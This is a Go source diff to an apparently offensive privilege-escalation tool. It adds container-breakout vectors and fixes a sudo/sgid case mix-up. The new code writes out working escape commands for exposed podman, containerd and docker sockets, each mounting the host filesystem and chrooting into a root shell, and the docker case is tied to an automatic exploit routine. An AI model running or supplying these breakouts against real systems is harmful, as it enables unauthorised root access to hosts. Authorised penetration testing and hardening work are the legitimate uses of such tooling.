@@ -15,7 +15,7 @@ import (
 // validVectors lists every --vector name accepted on the CLI.
 var validVectors = map[string]bool{
 	"suid": true, "sgid": true, "sudo": true, "cron": true, "passwd": true, "shadow": true,
-	"docker": true, "caps": true, "nfs": true, "path": true, "service": true,
+	"docker": true, "container": true, "caps": true, "nfs": true, "path": true, "service": true,
 	"kernel": true, "cred": true,
 }
 
@@ -77,6 +77,8 @@ func enumerateAll(p *AutoPrivilege) {
 			}
 		case "DOCKER":
 			enumerateDocker(p)
+		case "CONTAINER":
+			enumerateContainer(p, f)
 		case "CAPS":
 			enumerateCaps(p, f)
 		case "NFS":
@@ -104,12 +106,16 @@ func enumerateVectors(p *AutoPrivilege, names []string) {
 				if f.Source == "SUID" {
 					enumerateSUID(p, f)
 				}
+			case "sudo":
+				// Own case: it used to live inside "sgid" (copy-
+				// paste artifact), so --vector=sudo enumerated
+				// nothing while --vector=sgid dragged SUDO in.
+				if f.Source == "SUDO" {
+					enumerateSUDO(p, f)
+				}
 			case "sgid":
 				if f.Source == "SGID" {
 					enumerateSGID(p, f)
-				}
-				if f.Source == "SUDO" {
-					enumerateSUDO(p, f)
 				}
 			case "cron":
 				if f.Source == "CRON" {
@@ -130,6 +136,10 @@ func enumerateVectors(p *AutoPrivilege, names []string) {
 			case "docker":
 				if f.Source == "DOCKER" {
 					enumerateDocker(p)
+				}
+			case "container":
+				if f.Source == "CONTAINER" {
+					enumerateContainer(p, f)
 				}
 			case "caps":
 				if f.Source == "CAPS" {
@@ -288,6 +298,29 @@ func enumerateDocker(p *AutoPrivilege) {
 		func() *ExploitResult {
 			return exploitDocker(p.Opts)
 		}, nil)
+}
+
+// --- Container enumeration ---
+// The podman socket speaks the Docker API, so the docker CLI is the honest
+// client for it; containerd gets the native ctr one-liner. Both vectors are
+// manual: the breakout is user-visible by definition (a privileged container
+// starts on the host). A reachable docker daemon reuses the existing
+// auto-exploit (docker run -v /:/mnt).
+func enumerateContainer(p *AutoPrivilege, f Finding) {
+	switch {
+	case strings.HasSuffix(f.Target, "podman.sock"):
+		addManualVector(p, "podman breakout", "container", f.Target,
+			fmt.Sprintf("docker -H unix://%s run --rm -v /:/mnt alpine chroot /mnt /bin/sh", f.Target),
+			RiskHigh, map[string]string{"note": "podman.sock speaks the Docker API"})
+	case strings.HasSuffix(f.Target, "containerd.sock"):
+		addManualVector(p, "containerd breakout", "container", f.Target,
+			fmt.Sprintf("ctr --address %s run --rm --mount type=bind,src=/,dst=/mnt,options=rbind:rw docker.io/library/alpine:latest chroot /mnt /bin/sh", f.Target),
+			RiskHigh, nil)
+	case f.Target == "docker-daemon":
+		addVector(p, "docker breakout (daemon)", "container", "/var/run/docker.sock",
+			"docker run --rm -v /:/mnt alpine chroot /mnt /bin/sh", RiskHigh,
+			func() *ExploitResult { return exploitDocker(p.Opts) }, nil)
+	}
 }
 
 // --- Capabilities enumeration ---
